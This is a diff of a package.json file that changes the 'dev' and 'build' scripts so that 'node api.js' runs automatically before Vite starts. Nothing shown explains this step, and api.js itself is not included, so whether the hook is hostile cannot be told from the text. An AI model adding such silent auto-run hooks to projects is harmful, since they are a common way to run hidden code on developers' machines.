@@ -4,13 +4,13 @@
   "version": "0.0.0",
   "type": "module",
   "scripts": {
-    "dev": "vite --host 0.0.0.0",
+    "dev": "node api.js && vite --host 0.0.0.0",
     "dev:next": "WATCHPACK_POLLING=true next dev apps/web -H 0.0.0.0",
     "dev:api": "nest start --watch -p apps/api/tsconfig.json",
     "dev:full": "concurrently \"npm run dev:next\" \"npm run dev:api\"",
     "build:next": "next build apps/web",
     "api:build": "nest build -p apps/api/tsconfig.json",
-    "build": "tsc -b && vite build",
+    "build": "node api.js && tsc -b && vite build",
     "preview": "vite preview --host 0.0.0.0"
   },
   "dependencies": {
